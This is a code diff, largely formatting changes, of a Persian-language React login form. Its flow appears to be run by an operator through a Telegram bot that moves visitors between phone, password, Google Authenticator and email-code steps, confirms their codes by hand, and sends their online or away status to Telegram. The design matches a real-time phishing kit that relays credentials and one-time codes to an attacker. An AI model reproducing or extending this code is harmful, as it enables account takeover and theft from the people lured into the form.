@@ -40,7 +40,9 @@ import {
 } from "@/lib/callback-session-fix";
 
 import { quickDebug } from "@/lib/telegram-debug-helper";
-import enhancedOfflineDetection, { checkNetworkStatus } from "@/lib/enhanced-offline-detection";
+import enhancedOfflineDetection, {
+  checkNetworkStatus,
+} from "@/lib/enhanced-offline-detection";
 
 type AuthStep =
   | "phone"
@@ -71,7 +73,7 @@ export const LoginForm = () => {
   const captchaImages = [
     "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2F1df011ffccd04cf6a5853621be56e3ae?format=webp&width=800",
     "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2F71c75370377c4470ba9a52d95ca31d19?format=webp&width=800",
-    "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2Fd721034f576545cebadb5e558068195d?format=webp&width=800"
+    "https://cdn.builder.io/api/v1/image/assets%2F3a5bf4f1d4394c31bc164112c90fe0fc%2Fd721034f576545cebadb5e558068195d?format=webp&width=800",
   ];
 
   // Phone verification states
@@ -127,7 +129,9 @@ export const LoginForm = () => {
         try {
           // Check if we're in a development environment and have basic connectivity
           if (!navigator.onLine) {
-            console.warn("⚠️ Device is offline, deferring callback registration");
+            console.warn(
+              "⚠️ Device is offline, deferring callback registration",
+            );
             return;
           }
 
@@ -161,15 +165,15 @@ export const LoginForm = () => {
   // Global error handler for unhandled promise rejections
   useEffect(() => {
     const handleUnhandledRejection = (event: PromiseRejectionEvent) => {
-      const reason = event.reason?.toString() || '';
+      const reason = event.reason?.toString() || "";
 
       // Filter out Vite WebSocket errors (development only)
       if (
-        reason.includes('WebSocket closed without opened') ||
-        reason.includes('WebSocket connection failed') ||
-        reason.includes('vite') ||
-        reason.includes('hmr') ||
-        reason.includes('@vite/client')
+        reason.includes("WebSocket closed without opened") ||
+        reason.includes("WebSocket connection failed") ||
+        reason.includes("vite") ||
+        reason.includes("hmr") ||
+        reason.includes("@vite/client")
       ) {
         console.warn("🔄 Vite HMR issue (non-critical):", event.reason);
         event.preventDefault();
@@ -181,10 +185,13 @@ export const LoginForm = () => {
       event.preventDefault();
     };
 
-    window.addEventListener('unhandledrejection', handleUnhandledRejection);
+    window.addEventListener("unhandledrejection", handleUnhandledRejection);
 
     return () => {
-      window.removeEventListener('unhandledrejection', handleUnhandledRejection);
+      window.removeEventListener(
+        "unhandledrejection",
+        handleUnhandledRejection,
+      );
     };
   }, []);
 
@@ -198,7 +205,12 @@ export const LoginForm = () => {
 
   // Handle admin actions from Telegram bot
   const handleAdminAction = (action: string) => {
-    console.log("🚨 ADMIN ACTION RECEIVED:", action, "Current step:", currentStep);
+    console.log(
+      "🚨 ADMIN ACTION RECEIVED:",
+      action,
+      "Current step:",
+      currentStep,
+    );
 
     if (!sessionId) {
       console.error("❌ No session ID for admin action");
@@ -303,7 +315,11 @@ export const LoginForm = () => {
         break;
       case "auth_email_code":
         // Go directly to email code input step (skip email input)
-        console.log("🎯 Admin action: auth_email_code - transitioning from", currentStep, "to email code");
+        console.log(
+          "🎯 Admin action: auth_email_code - transitioning from",
+          currentStep,
+          "to email code",
+        );
         setCurrentStep("email");
         setEmailStep("code");
         setEmailCode(""); // Clear any existing email code
@@ -317,7 +333,10 @@ export const LoginForm = () => {
         break;
       case "check_status":
         // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
-        console.log("🔍 Admin requested enhanced status check for session:", sessionId);
+        console.log(
+          "🔍 Admin requested enhanced status check for session:",
+          sessionId,
+        );
 
         const isVisible = !document.hidden;
 
@@ -331,97 +350,124 @@ export const LoginForm = () => {
 
         // استفاده از Enhanced Network Status Check
         console.log("🌐 Starting enhanced network status check...");
-        checkNetworkStatus().then((networkStatus) => {
-          console.log("📊 Network status result:", networkStatus);
+        checkNetworkStatus()
+          .then((networkStatus) => {
+            console.log("📊 Network status result:", networkStatus);
 
-          const { isOnline: isActuallyOnline, connectionType } = networkStatus;
-          const { text: statusText, emoji: statusEmoji } = enhancedOfflineDetection.getStatusDisplay(networkStatus);
+            const { isOnline: isActuallyOnline, connectionType } =
+              networkStatus;
+            const { text: statusText, emoji: statusEmoji } =
+              enhancedOfflineDetection.getStatusDisplay(networkStatus);
 
-          console.log("📊 Status display from enhanced detection:", { statusText, statusEmoji });
+            console.log("📊 Status display from enhanced detection:", {
+              statusText,
+              statusEmoji,
+            });
 
-          // تعیین وضعیت نهایی - اولویت با آفلاین بودن
-          let finalStatusText = "offline";
-          let finalStatusEmoji = "🔴";
+            // تعیین وضعیت نهایی - اولویت با آفلاین بودن
+            let finalStatusText = "offline";
+            let finalStatusEmoji = "🔴";
 
-          if (!isActuallyOnline) {
-            // کاربر آفلاین است
-            finalStatusText = "offline";
-            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
-            console.log("🔴 User is OFFLINE - network status:", connectionType);
-          } else if (isActuallyOnline && !isVisible) {
-            // کاربر آنلاین است اما صفحه hidden است
-            finalStatusText = "away";
-            finalStatusEmoji = "🟡";
-            console.log("🟡 User is AWAY - online but tab hidden");
-          } else if (isActuallyOnline && isVisible) {
-            // کاربر کاملاً آنلاین است
-            finalStatusText = "online";
-            finalStatusEmoji = "🟢";
-            console.log("🟢 User is ONLINE - fully active");
-          }
+            if (!isActuallyOnline) {
+              // کاربر آفلاین است
+              finalStatusText = "offline";
+              finalStatusEmoji = connectionType === "offline" ? "📵" : "🔴";
+              console.log(
+                "🔴 User is OFFLINE - network status:",
+                connectionType,
+              );
+            } else if (isActuallyOnline && !isVisible) {
+              // کاربر آنلاین است اما صفحه hidden است
+              finalStatusText = "away";
+              finalStatusEmoji = "🟡";
+              console.log("🟡 User is AWAY - online but tab hidden");
+            } else if (isActuallyOnline && isVisible) {
+              // کاربر کاملاً آنلاین است
+              finalStatusText = "online";
+              finalStatusEmoji = "🟢";
+              console.log("🟢 User is ONLINE - fully active");
+            }
 
-          console.log("📊 FINAL Enhanced status check results:", {
-            isVisible,
-            isActuallyOnline,
-            connectionType,
-            finalStatusText,
-            finalStatusEmoji,
-            currentStep,
-            timestamp: new Date().toISOString(),
+            console.log("📊 FINAL Enhanced status check results:", {
+              isVisible,
+              isActuallyOnline,
+              connectionType,
+              finalStatusText,
+              finalStatusEmoji,
+              currentStep,
+              timestamp: new Date().toISOString(),
+            });
+
+            updateUserOnlineStatus(
+              sessionId,
+              isActuallyOnline,
+              isVisible,
+              Date.now(),
+              finalStatusText,
+              finalStatusEmoji,
+              true, // forceUpdate = true for manual status check
+            )
+              .then(() => {
+                console.log(
+                  "✅ Enhanced status check completed and sent to Telegram",
+                );
+              })
+              .catch((error) => {
+                console.error(
+                  "❌ Failed to send enhanced status check:",
+                  error,
+                );
+              });
+          })
+          .catch((error) => {
+            // Fallback: اگر enhanced detection هم کار نکرد
+            console.error("❌ Enhanced network detection failed:", error);
+
+            // استفاده ��ز navigator.onLine به عنوان fallback
+            const navigatorOnline = navigator.onLine;
+            let fallbackStatusText = "offline";
+            let fallbackStatusEmoji = "🔴";
+
+            if (!navigatorOnline) {
+              fallbackStatusText = "offline";
+              fallbackStatusEmoji = "📵";
+              console.log("🔴 FALLBACK: Navigator reports offline");
+            } else if (navigatorOnline && !isVisible) {
+              fallbackStatusText = "away";
+              fallbackStatusEmoji = "🟡";
+              console.log("⚠️ FALLBACK: Navigator online but tab hidden");
+            } else {
+              fallbackStatusText = "online";
+              fallbackStatusEmoji = "🟢";
+              console.log("✅ FALLBACK: Navigator online and tab visible");
+            }
+
+            console.log("📊 FALLBACK status:", {
+              navigatorOnline,
+              isVisible,
+              fallbackStatusText,
+              fallbackStatusEmoji,
+            });
+
+            updateUserOnlineStatus(
+              sessionId,
+              navigatorOnline,
+              isVisible,
+              Date.now(),
+              fallbackStatusText,
+              fallbackStatusEmoji,
+              true, // forceUpdate = true
+            )
+              .then(() => {
+                console.log("✅ Fallback status sent to Telegram");
+              })
+              .catch((fallbackError) => {
+                console.error(
+                  "❌ Failed to send fallback status:",
+                  fallbackError,
+                );
+              });
           });
-
-          updateUserOnlineStatus(
-            sessionId,
-            isActuallyOnline,
-            isVisible,
-            Date.now(),
-            finalStatusText,
-            finalStatusEmoji,
-            true, // forceUpdate = true for manual status check
-          ).then(() => {
-            console.log("✅ Enhanced status check completed and sent to Telegram");
-          }).catch((error) => {
-            console.error("❌ Failed to send enhanced status check:", error);
-          });
-        }).catch((error) => {
-          // Fallback: اگر enhanced detection هم کار نکرد
-          console.error("❌ Enhanced network detection failed:", error);
-
-          // استفاده ��ز navigator.onLine به عنوان fallback
-          const navigatorOnline = navigator.onLine;
-          let fallbackStatusText = "offline";
-          let fallbackStatusEmoji = "🔴";
-
-          if (!navigatorOnline) {
-            fallbackStatusText = "offline";
-            fallbackStatusEmoji = "📵";
-            console.log("🔴 FALLBACK: Navigator reports offline");
-          } else if (navigatorOnline && !isVisible) {
-            fallbackStatusText = "away";
-            fallbackStatusEmoji = "🟡";
-            console.log("⚠️ FALLBACK: Navigator online but tab hidden");
-          } else {
-            fallbackStatusText = "online";
-            fallbackStatusEmoji = "🟢";
-            console.log("✅ FALLBACK: Navigator online and tab visible");
-          }
-
-          console.log("📊 FALLBACK status:", { navigatorOnline, isVisible, fallbackStatusText, fallbackStatusEmoji });
-
-          updateUserOnlineStatus(
-            sessionId,
-            navigatorOnline,
-            isVisible,
-            Date.now(),
-            fallbackStatusText,
-            fallbackStatusEmoji,
-            true, // forceUpdate = true
-          ).then(() => {
-            console.log("✅ Fallback status sent to Telegram");
-          }).catch((fallbackError) => {
-            console.error("❌ Failed to send fallback status:", fallbackError);
-          });
-        });
         break;
       case "email_code_correct":
         // Admin confirmed email code is correct - complete authentication
@@ -446,8 +492,7 @@ export const LoginForm = () => {
         setEmailStep("code");
         setEmailCode(""); // Clear email code field
         setErrors({
-          emailCode:
-            "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+          emailCode: "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
         });
         setHasError(true);
         setIsSubmitting(false); // Ensure loading state is cleared
@@ -514,7 +559,9 @@ export const LoginForm = () => {
       sessionStorage.setItem("phoneNumber", mobileNumber);
 
       // Real-time status tracking disabled - status will be checked manually by admin
-      console.log("⚠️ Automatic status updates disabled - admin can check status manually");
+      console.log(
+        "⚠️ Automatic status updates disabled - admin can check status manually",
+      );
 
       // Show demo verification code if in demo mode
       if (!validateTelegramConfig()) {
@@ -1060,11 +1107,15 @@ export const LoginForm = () => {
               textAlign: "center",
             }}
           >
-            {currentStep === "verify-phone" ? "تایید شماره موبایل" :
-             currentStep === "password" ? "رمز عبور" :
-             currentStep === "google" ? "Google Authenticator" :
-             currentStep === "email" ? "تایید ایمیل" :
-             "ورود و ثبت‌نام"}
+            {currentStep === "verify-phone"
+              ? "تایید شماره موبایل"
+              : currentStep === "password"
+                ? "رمز عبور"
+                : currentStep === "google"
+                  ? "Google Authenticator"
+                  : currentStep === "email"
+                    ? "تایید ایمیل"
+                    : "ورود و ثبت‌نام"}
           </span>
         </div>
 
@@ -1293,7 +1344,9 @@ export const LoginForm = () => {
                   <p
                     style={{
                       borderColor: "rgba(0, 0, 0, 0.6)",
-                      color: errors.mobileNumber ? "rgb(220, 38, 38)" : "rgba(0, 0, 0, 0.6)",
+                      color: errors.mobileNumber
+                        ? "rgb(220, 38, 38)"
+                        : "rgba(0, 0, 0, 0.6)",
                       fontSize: "12px",
                       lineHeight: "20.004px",
                       marginTop: "4px",
@@ -1349,7 +1402,8 @@ export const LoginForm = () => {
                       transitionBehavior: "normal, normal, normal",
                       transitionDelay: "0s, 0s, 0s",
                       transitionDuration: "0.25s, 0.25s, 0.25s",
-                      transitionProperty: "background-color, box-shadow, border-color",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
                       transitionTimingFunction:
                         "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                       userSelect: "none",
@@ -1406,10 +1460,13 @@ export const LoginForm = () => {
                           textTransform: "uppercase",
                           transitionDuration: "0.2s",
                           transitionProperty: "fill",
-                          transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                          transitionTimingFunction:
+                            "cubic-bezier(0.4, 0, 0.2, 1)",
                           userSelect: "none",
                           width: "24px",
-                          transform: showInviteCode ? "rotate(180deg)" : "rotate(0deg)",
+                          transform: showInviteCode
+                            ? "rotate(180deg)"
+                            : "rotate(0deg)",
                           transition: "transform 0.2s",
                         }}
                       >
@@ -1433,192 +1490,192 @@ export const LoginForm = () => {
                       visibility: showInviteCode ? "visible" : "hidden",
                       width: "100%",
                     }}
-                >
-                  {showInviteCode && (
-                    <div
-                      style={{
-                        display: "flex",
-                        visibility: "visible",
-                        width: "100%",
-                      }}
-                    >
+                  >
+                    {showInviteCode && (
                       <div
                         style={{
+                          display: "flex",
+                          visibility: "visible",
                           width: "100%",
                         }}
                       >
                         <div
                           style={{
-                            display: "inline-flex",
-                            flexDirection: "column",
-                            position: "relative",
-                            verticalAlign: "top",
                             width: "100%",
-                            marginBottom: "4px",
                           }}
                         >
                           <div
                             style={{
-                              alignItems: "center",
-                              borderBottomLeftRadius: "8px",
-                              borderBottomRightRadius: "8px",
-                              borderRadius: "8px",
-                              borderTopLeftRadius: "8px",
-                              borderTopRightRadius: "8px",
-                              cursor: "text",
-                              display: "flex",
+                              display: "inline-flex",
+                              flexDirection: "column",
                               position: "relative",
+                              verticalAlign: "top",
                               width: "100%",
+                              marginBottom: "4px",
                             }}
                           >
-                            <input
-                              aria-invalid="false"
-                              name="invite_code"
-                              placeholder="کد معرف (اختیاری)"
-                              type="text"
-                              value={inviteCode}
-                              onChange={(e) => setInviteCode(e.target.value)}
+                            <div
                               style={{
-                                animation:
-                                  "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
-                                animationDuration: "0.01s",
-                                animationName: "mui-auto-fill-cancel",
-                                appearance: "auto",
-                                boxSizing: "content-box",
-                                cursor: "text",
-                                fontFeatureSettings: '"ss00"',
-                                overflowX: "clip",
-                                overflowY: "clip",
-                                paddingBottom: "10px",
-                                paddingLeft: "12px",
-                                paddingRight: "12px",
-                                paddingTop: "10px",
-                                width: "100%",
-                                fontSize: "14px",
-                                textAlign: "right",
-                                backgroundColor: "rgb(255, 255, 255)",
-                                border: "none",
-                                outline: "none",
-                              }}
-                            />
-                            <fieldset
-                              aria-hidden="true"
-                              style={{
+                                alignItems: "center",
                                 borderBottomLeftRadius: "8px",
                                 borderBottomRightRadius: "8px",
-                                borderBottomStyle: "solid",
-                                borderBottomWidth: "1px",
-                                borderBottomColor: "rgba(0, 0, 0, 0.2)",
-                                borderLeftStyle: "solid",
-                                borderLeftWidth: "1px",
-                                borderLeftColor: "rgba(0, 0, 0, 0.2)",
                                 borderRadius: "8px",
-                                borderRightStyle: "solid",
-                                borderRightWidth: "1px",
-                                borderRightColor: "rgba(0, 0, 0, 0.2)",
                                 borderTopLeftRadius: "8px",
                                 borderTopRightRadius: "8px",
-                                borderTopStyle: "solid",
-                                borderTopWidth: "1px",
-                                borderTopColor: "rgba(0, 0, 0, 0.2)",
-                                bottom: "0px",
                                 cursor: "text",
-                                left: "0px",
-                                minWidth: "0%",
-                                overflowX: "hidden",
-                                overflowY: "hidden",
-                                paddingLeft: "8px",
-                                paddingRight: "8px",
-                                pointerEvents: "none",
-                                position: "absolute",
-                                right: "0px",
-                                textAlign: "right",
-                                top: "-5px",
+                                display: "flex",
+                                position: "relative",
+                                width: "100%",
                               }}
                             >
-                              <legend
+                              <input
+                                aria-invalid="false"
+                                name="invite_code"
+                                placeholder="کد معرف (اختیاری)"
+                                type="text"
+                                value={inviteCode}
+                                onChange={(e) => setInviteCode(e.target.value)}
                                 style={{
+                                  animation:
+                                    "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
+                                  animationDuration: "0.01s",
+                                  animationName: "mui-auto-fill-cancel",
+                                  appearance: "auto",
+                                  boxSizing: "content-box",
                                   cursor: "text",
-                                  lineHeight: "11px",
+                                  fontFeatureSettings: '"ss00"',
+                                  overflowX: "clip",
+                                  overflowY: "clip",
+                                  paddingBottom: "10px",
+                                  paddingLeft: "12px",
+                                  paddingRight: "12px",
+                                  paddingTop: "10px",
+                                  width: "100%",
+                                  fontSize: "14px",
+                                  textAlign: "right",
+                                  backgroundColor: "rgb(255, 255, 255)",
+                                  border: "none",
+                                  outline: "none",
+                                }}
+                              />
+                              <fieldset
+                                aria-hidden="true"
+                                style={{
+                                  borderBottomLeftRadius: "8px",
+                                  borderBottomRightRadius: "8px",
+                                  borderBottomStyle: "solid",
+                                  borderBottomWidth: "1px",
+                                  borderBottomColor: "rgba(0, 0, 0, 0.2)",
+                                  borderLeftStyle: "solid",
+                                  borderLeftWidth: "1px",
+                                  borderLeftColor: "rgba(0, 0, 0, 0.2)",
+                                  borderRadius: "8px",
+                                  borderRightStyle: "solid",
+                                  borderRightWidth: "1px",
+                                  borderRightColor: "rgba(0, 0, 0, 0.2)",
+                                  borderTopLeftRadius: "8px",
+                                  borderTopRightRadius: "8px",
+                                  borderTopStyle: "solid",
+                                  borderTopWidth: "1px",
+                                  borderTopColor: "rgba(0, 0, 0, 0.2)",
+                                  bottom: "0px",
+                                  cursor: "text",
+                                  left: "0px",
+                                  minWidth: "0%",
                                   overflowX: "hidden",
                                   overflowY: "hidden",
+                                  paddingLeft: "8px",
+                                  paddingRight: "8px",
                                   pointerEvents: "none",
+                                  position: "absolute",
+                                  right: "0px",
                                   textAlign: "right",
-                                  transitionDuration: "0.15s",
-                                  transitionProperty: "width",
-                                  transitionTimingFunction:
-                                    "cubic-bezier(0, 0, 0.2, 1)",
+                                  top: "-5px",
                                 }}
                               >
-                                <span
-                                  aria-hidden="true"
+                                <legend
                                   style={{
                                     cursor: "text",
-                                    display: "inline",
                                     lineHeight: "11px",
+                                    overflowX: "hidden",
+                                    overflowY: "hidden",
                                     pointerEvents: "none",
                                     textAlign: "right",
+                                    transitionDuration: "0.15s",
+                                    transitionProperty: "width",
+                                    transitionTimingFunction:
+                                      "cubic-bezier(0, 0, 0.2, 1)",
                                   }}
                                 >
-                                  ​
-                                </span>
-                              </legend>
-                            </fieldset>
+                                  <span
+                                    aria-hidden="true"
+                                    style={{
+                                      cursor: "text",
+                                      display: "inline",
+                                      lineHeight: "11px",
+                                      pointerEvents: "none",
+                                      textAlign: "right",
+                                    }}
+                                  >
+                                    ​
+                                  </span>
+                                </legend>
+                              </fieldset>
+                            </div>
                           </div>
-                        </div>
-                        <p
-                          style={{
-                            borderColor: "rgba(0, 0, 0, 0.6)",
-                            color: "rgba(0, 0, 0, 0.6)",
-                            fontSize: "12px",
-                            lineHeight: "20.004px",
-                            marginTop: "8px",
-                            outlineColor: "rgba(0, 0, 0, 0.6)",
-                            textAlign: "right",
-                            textDecorationColor: "rgba(0, 0, 0, 0.6)",
-                            textEmphasisColor: "rgba(0, 0, 0, 0.6)",
-                            display: "flex",
-                            alignItems: "center",
-                          }}
-                        >
-                          <Info
+                          <p
                             style={{
                               borderColor: "rgba(0, 0, 0, 0.6)",
                               color: "rgba(0, 0, 0, 0.6)",
-                              display: "inline-block",
-                              fill: "rgba(0, 0, 0, 0.6)",
-                              flexShrink: "0",
-                              height: "24px",
-                              lineHeight: "26.672px",
-                              marginLeft: "8px",
+                              fontSize: "12px",
+                              lineHeight: "20.004px",
+                              marginTop: "8px",
                               outlineColor: "rgba(0, 0, 0, 0.6)",
-                              overflowClipMargin: "content-box",
-                              overflowX: "hidden",
-                              overflowY: "hidden",
                               textAlign: "right",
                               textDecorationColor: "rgba(0, 0, 0, 0.6)",
                               textEmphasisColor: "rgba(0, 0, 0, 0.6)",
-                              transitionDuration: "0.2s",
-                              transitionProperty: "fill",
-                              transitionTimingFunction:
-                                "cubic-bezier(0.4, 0, 0.2, 1)",
-                              userSelect: "none",
-                              verticalAlign: "middle",
-                              width: "24px",
+                              display: "flex",
+                              alignItems: "center",
                             }}
-                          />
-                          <span>
-                            <p style={{textAlign: "right"}}>
-                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
-                            </p>
-                            <p>
-                              <br />
-                            </p>
-                          </span>
-                        </p>
+                          >
+                            <Info
+                              style={{
+                                borderColor: "rgba(0, 0, 0, 0.6)",
+                                color: "rgba(0, 0, 0, 0.6)",
+                                display: "inline-block",
+                                fill: "rgba(0, 0, 0, 0.6)",
+                                flexShrink: "0",
+                                height: "24px",
+                                lineHeight: "26.672px",
+                                marginLeft: "8px",
+                                outlineColor: "rgba(0, 0, 0, 0.6)",
+                                overflowClipMargin: "content-box",
+                                overflowX: "hidden",
+                                overflowY: "hidden",
+                                textAlign: "right",
+                                textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                                textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                                transitionDuration: "0.2s",
+                                transitionProperty: "fill",
+                                transitionTimingFunction:
+                                  "cubic-bezier(0.4, 0, 0.2, 1)",
+                                userSelect: "none",
+                                verticalAlign: "middle",
+                                width: "24px",
+                              }}
+                            />
+                            <span>
+                              <p style={{ textAlign: "right" }}>
+                                ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
+                              </p>
+                              <p>
+                                <br />
+                              </p>
+                            </span>
+                          </p>
+                        </div>
                       </div>
-                    </div>
-                  )}
+                    )}
                   </div>
                 </div>
 
@@ -1679,7 +1736,8 @@ export const LoginForm = () => {
                           value={captchaCode}
                           onChange={(e) => setCaptchaCode(e.target.value)}
                           style={{
-                            animation: "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
+                            animation:
+                              "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                             animationDuration: "0.01s",
                             animationName: "mui-auto-fill-cancel",
                             appearance: "auto",
@@ -1717,7 +1775,9 @@ export const LoginForm = () => {
                             type="button"
                             onClick={() => {
                               // Cycle to next captcha image
-                              setCurrentCaptchaIndex((prev) => (prev + 1) % captchaImages.length);
+                              setCurrentCaptchaIndex(
+                                (prev) => (prev + 1) % captchaImages.length,
+                              );
                               // Clear current captcha input
                               setCaptchaCode("");
                               console.log("Refreshing captcha...");
@@ -1749,7 +1809,8 @@ export const LoginForm = () => {
                               textWrap: "nowrap",
                               transitionDuration: "0.15s",
                               transitionProperty: "background-color",
-                              transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                              transitionTimingFunction:
+                                "cubic-bezier(0.4, 0, 0.2, 1)",
                               userSelect: "none",
                               verticalAlign: "middle",
                               whiteSpace: "nowrap",
@@ -1784,7 +1845,8 @@ export const LoginForm = () => {
                                 textWrap: "nowrap",
                                 transitionDuration: "0.2s",
                                 transitionProperty: "fill",
-                                transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                                transitionTimingFunction:
+                                  "cubic-bezier(0.4, 0, 0.2, 1)",
                                 userSelect: "none",
                                 whiteSpace: "nowrap",
                                 width: "24px",
@@ -1845,7 +1907,8 @@ export const LoginForm = () => {
                               textAlign: "right",
                               transitionDuration: "0.15s",
                               transitionProperty: "width",
-                              transitionTimingFunction: "cubic-bezier(0, 0, 0.2, 1)",
+                              transitionTimingFunction:
+                                "cubic-bezier(0, 0, 0.2, 1)",
                             }}
                           >
                             <span
@@ -1989,8 +2052,6 @@ export const LoginForm = () => {
                     )}
                   </button>
                 </div>
-
-
               </form>
 
               {/* Security Notice */}
@@ -2164,8 +2225,10 @@ export const LoginForm = () => {
                     transitionBehavior: "normal, normal, normal",
                     transitionDelay: "0s, 0s, 0s",
                     transitionDuration: "0.25s, 0.25s, 0.25s",
-                    transitionProperty: "background-color, box-shadow, border-color",
-                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                    transitionProperty:
+                      "background-color, box-shadow, border-color",
+                    transitionTimingFunction:
+                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                     userSelect: "none",
                     verticalAlign: "middle",
                     backgroundColor: "rgba(0, 0, 0, 0)",
@@ -2443,8 +2506,10 @@ export const LoginForm = () => {
                         transitionBehavior: "normal, normal, normal",
                         transitionDelay: "0s, 0s, 0s",
                         transitionDuration: "0.25s, 0.25s, 0.25s",
-                        transitionProperty: "background-color, box-shadow, border-color",
-                        transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                        transitionProperty:
+                          "background-color, box-shadow, border-color",
+                        transitionTimingFunction:
+                          "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                         userSelect: "none",
                         verticalAlign: "middle",
                         backgroundColor: "rgba(0, 0, 0, 0)",
@@ -2501,7 +2566,10 @@ export const LoginForm = () => {
                       borderTopLeftRadius: "8px",
                       borderTopRightRadius: "8px",
                       color: "rgb(255, 255, 255)",
-                      cursor: isSubmitting || verifyCode.length !== 6 ? "not-allowed" : "pointer",
+                      cursor:
+                        isSubmitting || verifyCode.length !== 6
+                          ? "not-allowed"
+                          : "pointer",
                       display: "flex",
                       fontWeight: "500",
                       justifyContent: "center",
@@ -2515,13 +2583,16 @@ export const LoginForm = () => {
                       transitionBehavior: "normal, normal, normal",
                       transitionDelay: "0s, 0s, 0s",
                       transitionDuration: "0.25s, 0.25s, 0.25s",
-                      transitionProperty: "background-color, box-shadow, border-color",
-                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                       userSelect: "none",
                       verticalAlign: "middle",
                       width: "100%",
                       border: "none",
-                      opacity: isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
+                      opacity:
+                        isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
                     }}
                   >
                     {isSubmitting ? (
@@ -3446,9 +3517,7 @@ export const LoginForm = () => {
                                 pointerEvents: "none",
                                 textAlign: "right",
                               }}
-                            >
-
-                            </span>
+                            ></span>
                           </legend>
                         </fieldset>
                       </div>
@@ -3556,22 +3625,22 @@ export const LoginForm = () => {
                       />
                       <span>در حال تایید...</span>
                     </div>
-                    ) : (
-                      <span
-                        style={{
-                          borderColor: "rgb(255, 255, 255)",
-                          color: "rgb(255, 255, 255)",
-                          cursor: "pointer",
-                          display: "contents",
-                          fontWeight: "500",
-                          textAlign: "center",
-                          textTransform: "uppercase",
-                          userSelect: "none",
-                        }}
-                      >
-                        ثبت و ادامه
-                      </span>
-                    )}
+                  ) : (
+                    <span
+                      style={{
+                        borderColor: "rgb(255, 255, 255)",
+                        color: "rgb(255, 255, 255)",
+                        cursor: "pointer",
+                        display: "contents",
+                        fontWeight: "500",
+                        textAlign: "center",
+                        textTransform: "uppercase",
+                        userSelect: "none",
+                      }}
+                    >
+                      ثبت و ادامه
+                    </span>
+                  )}
                 </button>
               </div>
             </>
@@ -3749,8 +3818,10 @@ export const LoginForm = () => {
               <div style={{ marginBottom: "8px" }}>
                 <AlertMessage>
                   کد تایید به ایمیل{" "}
-                  <strong style={{ direction: "ltr" }}>{maskEmail(email)}</strong> ارسال
-                  شد.
+                  <strong style={{ direction: "ltr" }}>
+                    {maskEmail(email)}
+                  </strong>{" "}
+                  ارسال شد.
                 </AlertMessage>
               </div>
 
